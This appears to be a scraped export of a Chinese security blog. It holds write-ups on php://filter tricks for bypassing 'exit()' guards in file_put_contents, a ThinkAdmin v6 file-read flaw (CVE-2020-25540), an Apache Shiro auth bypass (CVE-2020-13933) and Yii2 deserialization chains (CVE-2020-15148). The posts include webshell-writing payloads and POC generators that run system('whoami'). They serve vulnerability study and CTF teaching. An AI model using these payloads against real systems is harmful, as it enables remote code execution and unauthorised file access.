$content=\"php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php\" 代码合并之后为 &lt;?php exit(); php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php 分析合并之后的代码文件内容，发现成功构造 php 标签 &lt;?php ?&gt; ，同时也会发现代码中的字符 = 也被包含在 php 标签内，经过 strip_tags 处理之后都会删除，就不会影响 base64 的解码了。 虽然这样生成成功，但是因为文件名为 '?&gt;PD9waHAgcGhwaW5mbygpOz8+.php' ，在浏览器访问时，会出现访问不到的问题，主要是因为存在引号。可以通过利用伪目录的方法进行变相的绕过。 $content=\"php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\" 将 ?&gt;PD9waHAgcGhwaW5mbygpOz8+ 作为目录名，无论存在不存在，再利用 ../ 回退到原目录，这样创建出来的文件名就正常了。 为什么无法再 windows 下利用呢，主要原因是因为 windows 不支持文件名中有 ? &gt; 这样的字符。 ② (改头换面) $content=\"php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\"; 按照某篇文章所描述来讲，这个 payload 利用成功的原因是首先会根据 strip_tags 将 &lt;?|string.strip_tags|convert.base64-decode/resource=?&gt; 部分删去，然后将剩余的部分 base64-decode。然而经过测试，这样的 payload 也是可以成功的。 $content=\"php://filter/A|&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\"; 所以描述的应该并不正确，应该是类似开启了贪婪模式，直接从最前面的一个 &lt;? 匹配至最后面的 ?&gt; 把这些全部删除。然后再将剩余的部分进行 base64解码。 但是针对于 file_put_contents(\\$content,\"&lt;?php exit();?&gt;\".$content); 情况时，前面的 &lt;? 已经闭合，为了满足后面的闭合，所以必须要添加这个无效的过滤器。 0x05 .htaccess的预包含利用 http://192.168.176.128/?content=php://filter/string.strip_tags/?%3Ephp_value%20auto_prepend_file%20flag%20%0a%23/resource=.htaccess 利用 %0a 进行换行 # 注释后面的杂糅代码 file_put_contents($filename,$content . “\\nxxxxxx”); 这种情况较为简单，仅仅需要让后面的杂糅代码被注释掉就就可以，针对 php 而言，拥有特殊的起始符和结束符，如果可以写入 php 代码的话，就可以轻易的绕过后面的杂糅代码。 但是在禁止使用拥有特殊起始符和结束符号的语言时，需要想办法处理掉杂糅的代码。通常利用 .htaccess 进行操作。 http://192.168.176.128/?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20flag%20%0a%23\\ 利用 %0a 进行换行 #\\ 注释后面的杂糅代码。 CTF 例题一 1234567891011121314151617181920212223242526272829&lt;?phpclass Yongen{ public $file; public $text; public function __construct($data) { return unserialize($data); } public function hasaki(){ $d = '&lt;?php die(\"nononon\");?&gt;'; $a= $d. $this-&gt;text; $file = $this-&gt;file; @file_put_contents($file, $a); } public function __destruct() { $this-&gt;hasaki(); } }$data = \"\"; if (isset($_POST['data'])){ $data = $_POST['data']; new Yongen($data); } else highlight_file(__FILE__); ?&gt; 这是一道比较典型的 php 反序列化，其中 $this -&gt; file = $file; &amp; $this -&gt; text = $text; 可控，同时 @file_put_contents($this-&gt; file,$a); 会以 $file 为文件名，&lt;?php die(\"nononon\");?&gt;+$text 为文件内容，生成一个文件。此处也是要想办法绕过死亡die() 谈一谈php://filter的妙用 一文中描述了三种方法。 巧用编码与解码 $file 可以控制协议，可以通过 php://filter 协议来施展魔法；使用 php://filter 的 base64-decode 方法，将 $a 解码，利用 php base64_decode 函数特性去除”死亡exit“。 base64 编码中仅仅包含64个可打印字符，php 在解码 base 64 时，遇到不在其中的字符时，会跳过这些字符，仅将合法的字符组成一个新的字符串进行解码。 123&lt;?php$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);base64_decode($_GET['txt']); 所以，当 $a 被加上 &lt;?php die(\"nononon\");?&gt; 以后，我们可以使用 php://filter/write=convert.base64-decode 来对其进行解码。在解码的过程中，字符 &lt;、?、(、)、;、&gt; 空格 等不符合 base64 编码的字符范围的将被忽略，所以最终被解码的字符仅有 phpdienononon 和其他传入的字符。 phpdienononon 一共是13个字符，因为 base64 算法解码是4个 byte 一组，所以给他增加三个 a 一共十六个字符，这样前面的字符串会被正常的解析，后面我们传入的 webshell 的 base64 也会被正常的解码。结果就是 &lt;?php die(\"nononon\");?&gt; 没有了。 POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=convert.base64-decode/resource=cccc.php'; public $text= 'aaaPD9waHAgcGhwaW5mbygpOyA/Pg==';}$data = new Yongen();print(serialize($data));?&gt; 利用字符串操作方法 &lt;?php die(\"nononon\");?&gt; 本质上是一个 XML 标签，可以利用 strip_tags 函数去除， php://filter 也是支持这个方法的。php://filter/write=strip_tags 但是把原本存在的 &lt;?php die(\"nononon\");?&gt; 去除之后，我们再写入 webshell 也会被删除。 php://filter 是允许使用多个过滤器的，我们可以将 webshell 进行 base64 编码。在调用 strip_tags 之后再进行 base64-decode。 POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=dddd.php'; public $text= 'PD9waHAgcGhwaW5mbygpOyA/Pg==';}$data = new Yongen();print(serialize($data));?&gt; rot13编码 &lt;?php exit; ?&gt; 在经过 rot13 编码之后会变成 &lt;?cuc rkvg; ?&gt; &lt;?cuc qvr(\"abababa\");?&gt; 在经过 rot13 编码之后会变成 &lt;?cuc qvr(\"abababa\");?&gt; 在 php 不开启 short_open_tag 短标签时，php 无法识别这个字符串。 POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=string.rot13/resource=eeee.php'; public $text= '&lt;?cuc cucvasb(); ?&gt;';}$data = new Yongen();print(serialize($data));?&gt; CTF 例题二 关于跳出死亡 exit() 还有一个类似的例子。 1234567891011121314151617&lt;?php show_source('index.php'); function getKey($path){ $name = $path.md5($_SERVER[\"REMOTE_ADDR\"]).'.php'; return $name; } echo $_SERVER[\"REMOTE_ADDR\"]; $expire = $_POST['expire']; $path = $_POST['path']; $filename = getKey($path); $value = $filename; $data = serialize($value); $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; $result = file_put_contents($filename, $data);?&gt; 我们可以注意到关键的部分位于 12$data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data;$result = file_put_contents($filename, $data); sprintf('%012d', $expire)，会返回12位的数字字符串，与 exit();?&gt; 拼接形成一段 php 代码。 由于 exit 的存在，正常情况下程序不会执行到 exit() 后面的内容。要想办法跳出死亡 exit()。 POST path=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet 参考文章 关于file_put_contents的一些小测试 file_put_content和死亡·杂糅代码之缘 探索php://filter在实战当中的奇技淫巧 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)","slug":"Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)","date":"2020-09-27T08:46:41.000Z","updated":"2021-03-09T15:57:27.162Z","comments":true,"path":"2020/09/27/Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)/","link":"","permalink":"http://yoursite.com/2020/09/27/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2020-25540)/","excerpt":"环境搭建 下载 ThinkAdmin 的过去版本","text":"环境搭建 下载 ThinkAdmin 的过去版本 通过 Commit 找到修复的位置，下载修复版本的前一个版本 可以通过对比，重点关注修复的相关信息。 可以注意到对于任意文件读取的防护仅仅是加了 禁止目录级别上跳 下载老版本的方法为，找到修改前的 Commit 点击 Browse files 就可以下载过去的版本了。 按照配置创建和导入数据库，就安装成功了。 漏洞利用 获取版本信息 http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/version 读取网站目录 http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/node POST rules=[\"/\"] POST rules=[\"../\"] 任意文件读取 12345678910&lt;?phpfunction encode($content){ [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))]; for ($i = 0; $i &lt; $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0); return $chars;}var_dump(encode(\"public/static/../../poc.php\"));?&gt; http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b34332r1a342w34 漏洞分析 我下载的版本为漏洞修复前的版本，可能与网上的文章有些不同，不过大体上是相同的。 app/admin/controller/api/Update.php 中引用了两个 function 可不通过登录认证就可使用。 \\app\\admin\\controller\\api\\Update::version 可以获取到当前版本 目录穿越 \\app\\admin\\controller\\api\\Update::node 将 POST 传入的参数 rules &amp; ignore 传递给 ModuleService::instance()-&gt;getChanges() 跟进函数 \\think\\admin\\service\\ModuleService::getChanges 在 getChanges() 函数内，遍历传进的 $rules 数组，将参数进行转换，并与网站根目录进行路径拼接，传递给 _scanLocalFileHashList ，返回文件名与哈希值。 \\think\\admin\\service\\ModuleService::_scanLocalFileHashList 在 _scanLocalFileHashList 中，通过 scanDirectory 遍历传过来目录下的文件 \\think\\admin\\service\\NodeService::scanDirectory 如此，攻击者就可以在未授权的情况下实现读取网站的文件列表。 目前采用的修复方法是，在读取完文件之后，对路径进行一个判断，看是否符合 checkAllowDownload 再返回数据。 任意文件读取 \\app\\admin\\controller\\api\\Update::get 首先从 GET读取 encode 参数并使用 decode() 解码 \\decode 对应的加密函数 encode() \\encode 跟进函数 checkAllowDownload 对传入的路径进行判断 \\think\\admin\\service\\ModuleService::checkAllowDownload 然后跟进白名单判断函数 _getAllowDownloadRule() \\think\\admin\\service\\ModuleService::_getAllowDownloadRule 被允许的列表 123456config public/static public/router.php public/index.php app/admin app/wechat 也就是说 $name 的不能为 databases.php 并且必须要再允许列表内的。 可以通过 public/static/../../poc.php 来读取网站根目录下的 poc.php 针对 database.php 的限制，在 Windows 下可以通过 \" 来进行绕过。 public/static/../../config/database\"php emmm，但是我是没有读取出来。 事实上，利用这种方法是可以读取文件的 目前采用的修复方法还是添加了 1234// 禁止目录级别上跳 if (stripos($name, '..') !== false) { return false; } 思考 我想这个修复方法还是存在问题的，首先是对这些文件权限配置的问题，根本没有修复对文件的访问权限，再未登录的情况下，仍然能实现对文件的访问。其实是修复过滤的问题，虽然采用了增加黑名单的模式，但是，还是能直接获取得到网站的文件列表。 修复后还是首先对传入的路径进行一个查询，得出所有的文件的路径，然后将获取得到文件的路径进行判断，并不是直接对传入的路径进行判断。可能比较拗口，但是这样说，大概就能清楚。我们首先传入 / ，然后会获取得到网站根目录下所有文件的路径名，like app/admin/controller/Auth.php 然后这些值就会进行 checkAllowDownload 的检验。 然后白名单为 所以还是可以列出根目录下的一些文件滴。 目前的过滤的 .. 暂时没有什么方法可以绕过。但是漏洞的位置还是存在，如果特殊情况可以绕过 .. 的话，还是可以实现任意文件读取。 参考文章 ThinkAdmin v6 未授权列目录/任意文件读取 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 权限绕过漏洞(CVE-2020-13933)","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-13933)","date":"2020-09-23T02:27:47.000Z","updated":"2021-03-09T15:57:27.158Z","comments":true,"path":"2020/09/23/Apache Shiro 权限绕过漏洞(CVE-2020-13933)/","link":"","permalink":"http://yoursite.com/2020/09/23/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-13933)/","excerpt":"前言 之前分析了 Apache Shiro 权限绕过漏洞(CVE-2020-11989)，过了一段时间又出现了新的权限绕过漏洞 (CVE-2020-13933)。应该是在修复的基础上进行了绕过。 CVE-2020-11989 的影响版本为 Apache Shiro &lt; 1.5.3 , CVE-2020-13933 的影响版本为 Apache Shiro &lt; 1.6.0 。","text":"前言 之前分析了 Apache Shiro 权限绕过漏洞(CVE-2020-11989)，过了一段时间又出现了新的权限绕过漏洞 (CVE-2020-13933)。应该是在修复的基础上进行了绕过。 CVE-2020-11989 的影响版本为 Apache Shiro &lt; 1.5.3 , CVE-2020-13933 的影响版本为 Apache Shiro &lt; 1.6.0 。 在这个地方 Shiro 对 url 的处理是造成 CVE-2020-11989 的原因之一，Apache Shiro 1.5.3 对此进行的修复。 然后我们查看最新版的 Apache Shiro 1.6.0 发现在 web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java 增加了 从全局上对分号，反斜杠和非ASCII字符进行了过滤 环境搭建 还是选择 https://github.com/l3yx/springboot-shiro 项目进行测试 下载完成后修改一下 pom.xml 中 org.apache.shiro 所对应的版本号 为 1.5.3 ，同时将 LoginController 中修改为 1234@GetMapping(\"/admin/{name}\") public String admin(@PathVariable String name) { return \"admin page,hello \" + name; } 原因之后描述，同时为了方便调试，同时在 pom.xml 文件中加入 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.5.3&lt;/version&gt;&lt;/dependency&gt; 生成 war 包，部署于Tomcat 修改 \\apache-tomcat-8.0.52\\bin\\catalina.bat 文件 123if not \"%JPDA_ADDRESS%\" == \"\" goto gotJpdaAddressset JPDA_ADDRESS=127.0.0.1:5005:gotJpdaAddress catalina.bat jpda start 启动 ，配置 idea 中的远程调试 漏洞分析 Shiro 层 Tomcat 类中的 org.apache.catalina.core.ApplicationFilterChain 是用于管理针对请求 request 的过滤器。 Tomcat 的类 ApplicationFilterChain 是一个 Java Servlet API规范 javax.servlet.FilterChain 的实现，用于管理某个请求 request 的一组过滤器 Filter 的执行。当针对一个 reques 所定义的一组过滤器 Filter 处理完该请求后，组后一个 doFilter() 调用才会执行目标 Servlet 的方法 service(),然后响应对象 response 会按照相反的顺序依次被这些Filter处理，最终到达客户端。 根据调试时显示出的调用链，可以看到先执行到了 shiro 中的 OncePerRequestFilter 这个类 在 shiro 中 org.springframework.web.filter.OncePerRequestFilter 这个类是其他的所有 filter 的父类，所有的 filter 的 doFilter 方法都是调用的这个类中的 doFIlter 方法。 首先调用 getAlreadyFilteredAttributeName() 为过滤器标记，然后判断过滤器是否已经调用过，是否未为当前请求启用。 org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter 然后调用 doFilterInternal 方法，跟进后可以看到执行的是 public abstract class AbstractShiroFilter extends OncePerRequestFilter 中的 doFilterInternal 方法 org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal 跟进函数 executeChain org.apache.shiro.web.servlet.AbstractShiroFilter#executeChain 跟进函数 getExecutionChain org.apache.shiro.web.servlet.AbstractShiroFilter#getExecutionChain 跟进其中的 getChain org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 跟进方法 getPathWithinApplication org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getPathWithinApplication WebUtils#getPathWithinApplication 修复了之前 shiro 1.5.2 所存在的 url 双编码绕过问题。但是我们可以注意到最后的返回值是 /admin/ org.apache.shiro.web.util.WebUtils#getPathWithinApplication org.apache.shiro.web.util.WebUtils#getServletPath 返回值为 /admin/;whippet org.apache.shiro.web.util.WebUtils#getPathInfo 返回 \"\" org.apache.shiro.web.util.WebUtils#removeSemicolon 将 ; 及其之后的全部删除 回到函数 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 继续向下执行 如果请求的不是 /，就去除末尾的 / ，返回值就是 /admin private static final String DEFAULT_PATH_SEPARATOR = \"/\"; 接着根据 filterChainManager.getChainNames() 获取的拦截器进行匹配 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#pathMatches org.apache.shiro.util.AntPathMatcher#matches org.apache.shiro.util.AntPathMatcher#match org.apache.shiro.util.AntPathMatcher#doMatch pattDirs 的最后一位是 * 所以会返回 false 没有匹配到会返回 null 匹配到的话会指向 ProxiedFilterChain 1.路径匹配：pathMatches(pathPattern, requestURI)，默认的Fliter逐个与请求URI进行匹配；2、代理FilterChain：ProxiedFilterChain。如果匹配不上，那么直接走servlet的FilterChain，否则先走shiro的代理FilterChain（ProxiedFilterChain），之后再走servlet的FilterChain 继续单步执行 最后返回 ApplicationFilterChain 相当于并没有执行 Filter 此时就相当于已经绕过了 shiro 的权限验证，可以直接访问到需要权限目录下的文件，但是有时会返回这样的界面，是因为 Spring 并没有匹配到相对应的页面。 Spring层 chain.doFilter(request, response); 接下来的调用栈如图 Spring 在 Tomcat 中运行时需要提供对 Servlet 规范的支持，因为 Tomcat 时基于 Servlert 规范的 web 容器。 DispatcherServlet 是 Servlet 规范的具体实现。在 web 开发过程中，启动 Tomcat 容器时会根据其 Servlet 规范启动 Spring 实现的 DispatcherServlet ，这样就驱动了 Spring 的运行。 DispatcherServlet 在将请求映射到处理器时，调用了 getHandler org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler 跟进 getHandlerInternal org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal 通过 getLookupPathForRequest 获取请求的绝对路径 org.springframework.web.util.UrlPathHelper#getLookupPathForRequest(javax.servlet.http.HttpServletRequest) org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping 跟进函数 getPathWithinApplication org.springframework.web.util.UrlPathHelper#getPathWithinApplication 跟进函数 getRequestUri org.springframework.web.util.UrlPathHelper#getRequestUri decodeAndCleanUriString 对 url 进行了解码处理 org.springframework.web.util.UrlPathHelper#decodeAndCleanUriString 此处存在一个问题,因为利用 ; 就可以直接绕过 shiro 的权限验证，但是为什么在直接使用 ; 时会返回 404 错误，在 spring 中不能找到该页面 org.springframework.web.util.UrlPathHelper#decodeAndCleanUriString decodeAndCleanUriString 会先将 url 中 ; 后面的数据进行分割然后再进行 url 解码 解决了这个小小的问题，又产生了一个大大的疑问，在 Apache Shiro权限绕过漏洞分析(CVE-2020-11989) 一文中师傅所利用的 POC 为 /;/test/admin/page 如果是这样的话，从 ; 进行分割，最后得出来的应该是一直去请求 / 页面，不应返回权限下的页面，这个问题暂且放下，继续向下分析。 然后回到函数 org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal 跟进 lookupHandlerMethod org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#lookupHandlerMethod 跟进其中的 addMatchingMappings org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#addMatchingMappings org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingCondition org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatterns 此时我们可以注意到 /admin/{name} 与 /admin/;whippet 能够匹配成功。 会返回/admin/;whippet 的页面，此时的 name 值为 ;wippet ，如果之前我们并没有修改代码，而是固定的页面的话 访问 /admin/page 自然是与 admin/;page 匹配不上的。 参考文章 CVE-2020-13933: Apache Shiro 权限绕过漏洞分析 shiro源码篇 - shiro的filter，你值得拥有 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"CVE-2020-15148 Yii框架反序列化","slug":"CVE-2020-15148 Yii框架反序列化","date":"2020-09-21T05:49:01.000Z","updated":"2021-03-09T15:57:27.159Z","comments":true,"path":"2020/09/21/CVE-2020-15148 Yii框架反序列化/","link":"","permalink":"http://yoursite.com/2020/09/21/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"环境搭建 yii下载地址 影响范围 Yii2 &lt; 2.0.38","text":"环境搭建 yii下载地址 影响范围 Yii2 &lt; 2.0.38 选择一个漏洞影响的版本 yii-basic-app-2.0.37.tgz 下载后解压到 web 目录下，修改配置文件 config/web.php ，给 cookieValidationKey 字段设置一个值。 然后添加一个存在漏洞的 Action /controllers/TestController.php 1234567891011121314151617&lt;?phpnamespace app\\controllers;use Yii;use yii\\web\\Controller;class TestController extends Controller{ public function actionTest(){ $name = Yii::$app-&gt;request-&gt;get('unserialize'); return unserialize(base64_decode($name)); }}?&gt; 测试运行成功 漏洞分析 利用链 1 查看 github 的 commit 记录 发现在 /db/BatchQueryResult.php 中新增了 __wakeup() 方法，在 __wakeup() 方法中抛出异常。 unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 利用 __wakeup() 方法抛出一个异常，本质上是为了防止 BatchQueryResult 类被反序列化。 猜测 BatchQueryResult 类为反序列化的起点 vendor/yiisoft/yii2/db/BatchQueryResult.php::__destruct 1234567891011121314151617public function __destruct(){ // make sure cursor is closed $this-&gt;reset();}public function reset(){ if ($this-&gt;_dataReader !== null) { $this-&gt;_dataReader-&gt;close(); } $this-&gt;_dataReader = null; $this-&gt;_batch = null; $this-&gt;_value = null; $this-&gt;_key = null;} __destruct ( void ) : void 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __destruct 方法里面调用了 reset 方法， reset 方法里面又调用了 close 方法。 \\$this-&gt;_dataReader 的值可控，所以可以当作跳板去执行其他类中的魔术方法 __call() 方法。 public __call ( string $name , array $arguments ) : mixed 在对象中调用一个不可访问方法时，__call() 会被调用。 $name 参数是要调用的方法名称。$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数。 了解 __call() 方法之后，我们就可以进行全局搜索，找到其中不包含 close方法的类，就可以执行该类的__call() 方法。 全局搜索 function __call( vendor/fzaninotto/faker/src/Faker/Generator.php::__call 1234public function __call($method, $attributes) { return $this-&gt;format($method, $attributes); } 跟进 format vendor/fzaninotto/faker/src/Faker/Generator.php::format 1234public function format($formatter, $arguments = array()){ return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);} format 中调用了 call_user_func_array 方法 ，$formatter 与 $agruments 我们都不可控。此时 $formatter = close,$agruments为空。 $formatter 传递至 getFormatter() vendor/fzaninotto/faker/src/Faker/Generator.php::getFormatter 1234567891011121314public function getFormatter($formatter){ if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; } foreach ($this-&gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-&gt;formatters[$formatter] = array($provider, $formatter); return $this-&gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));} 我们注意到在 getFormatter 方法中，$this-&gt;formatters[$formatter] 是我们可以控制的，getFormatter 方法返回值是可控的。那么 call_user_func_array 这个函数的第一个参数可控，第二个参数为空。此时我们就可以调用 yii 框架中的任何一个无参的方法了。 call_user_func_array ( callable $callback , array $param_arr ) : mixed 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的参数传入。 调用类中的公共方法可以利用 call_user_func_array(['类名','类中的方法'],[]); 全局搜索 call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+), \\$this-&gt;([a-zA-Z0-9]+) 找到使用 call_user_func 函数，且参数为类中成员变量的所有方法。 利用其中的 vendor/yiisoft/yii2/rest/CreateAction.php::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} $this-&gt;checkAccess 以及 $this-&gt;id 都可控 所以利用链为： yii\\db\\BatchQueryResult::__destruct() yii\\db\\BatchQueryResult::reset() Faker\\Generator::__call() Faker\\Generator::format(‘close’,[]) call_user_func_array([‘new yii\\rest\\CreateAction’,‘run’],[]) yii\\rest\\CreateAction::run() call_user_func(‘system’,‘whoami’) 12345678910$n = yii\\db\\BatchQueryResult{ $this-&gt;_dataReader = Faker\\Generator{ $this-&gt;formatters['close'] = [ yii\\rest\\CreateAction{ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } ,'run']; }} POC 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } }}namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));}?&gt; 利用链2 BatchQueryResult 类仍为反序列化的起点，不利用魔术方法 __call()，选择将 $this-&gt;_dataReader 赋值为一个存在 close 方法的类，找到该类中 close方法调用中存在代码执行。 \\yii2\\web\\DbSession::close 12345678public function close(){ if ($this-&gt;getIsActive()) { // prepare writeCallback fields before session closes $this-&gt;fields = $this-&gt;composeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); }} 当 $this-&gt;getIsActive() 为 true 时，则会调用 $this-&gt;composeFields() 跟进 DbSession 的父类 MultiFieldSession 的父类 Session \\yii2\\web\\Session::getIsActive 1234public function getIsActive() { return session_status() === PHP_SESSION_ACTIVE; } 当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。默认安装情况下都返回true。 跟进 composeFields 方法，在DbSession 的父类 MultiFieldSession 中实现 \\yii\\web\\MultiFieldSession::composeFields 1234567891011protected function composeFields($id = null, $data = null){ $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : []; if ($id !== null) { $fields['id'] = $id; } if ($data !== null) { $fields['data'] = $data; } return $fields;} 发现调用了call_user_func函数， $this-&gt;writeCallback 可控，其余参数不可控。可以通过控制 $this-&gt;writeCallback 为 [‘类名’,‘类中的方法’] 来实现调用类中的方法。 全局搜索 call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+) 利用其中的 \\yii\\rest\\IndexAction::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} $this-&gt;checkAccess 以及 $this-&gt;id 都可控 利用链 yii\\db\\BatchQueryResult::__destruct() yii\\db\\BatchQueryResult::reset() yii\\web\\DbSession::close() yii\\web\\MultiFieldSession::composeFields() call_user_func_array([‘new yii\\rest\\IndexAction’,‘run’],[]) yii\\rest\\IndexAction::run() call_user_func(‘system’,‘whoami’) POC 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest { class IndexAction { public $checkAccess; public $id; public function __construct() { $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace yii\\web { use yii\\rest\\IndexAction; class DbSession { public $writeCallback; public function __construct() { $this-&gt;writeCallback = [new IndexAction(), \"run\"]; } }}namespace yii\\db { use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct() { $this-&gt;_dataReader = new DbSession(); } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));} 利用链3 \\Codeception\\Extension\\RunProcess::__destruct 1234public function __destruct() { $this-&gt;stopProcess(); } \\Codeception\\Extension\\RunProcess::stopProcess 123456789101112public function stopProcess() { foreach (array_reverse($this-&gt;processes) as $process) { /** @var $process Process **/ if (!$process-&gt;isRunning()) { continue; } $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine()); $process-&gt;stop(); } $this-&gt;processes = []; } 注意到 RunProcess 中的 __destruct 方法调用了 stopProcess() 方法， stopProcess() 方法 中的 $this-&gt;processes 可控，则 $process 可控，下面调用了 $process-&gt;isRunning() ，则又可以利用魔术方法 __call()。 利用链 \\Codeception\\Extension\\RunProcess::__destruct() \\Codeception\\Extension\\RunProcess::stopProcess() Faker\\Generator::__call() Faker\\Generator::format(‘isRunning’,[]) call_user_func_array([‘new yii\\rest\\CreateAction’,‘run’],[]) yii\\rest\\CreateAction::run() call_user_func(‘system’,‘whoami’) poc 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run']; } }}namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct(){ $this-&gt;processes = [new Generator]; } }}namespace{ echo base64_encode(serialize(new Codeception\\Extension\\RunProcess));}?&gt; 利用链4 \\Swift_KeyCache_DiskKeyCache::__destruct 123456public function __destruct(){ foreach ($this-&gt;keys as $nsKey =&gt; $null) { $this-&gt;clearAll($nsKey); }} \\Swift_KeyCache_DiskKeyCache::clearAll 123456789101112public function clearAll($nsKey){ if (array_key_exists($nsKey, $this-&gt;keys)) { foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) { $this-&gt;clearKey($nsKey, $itemKey); } 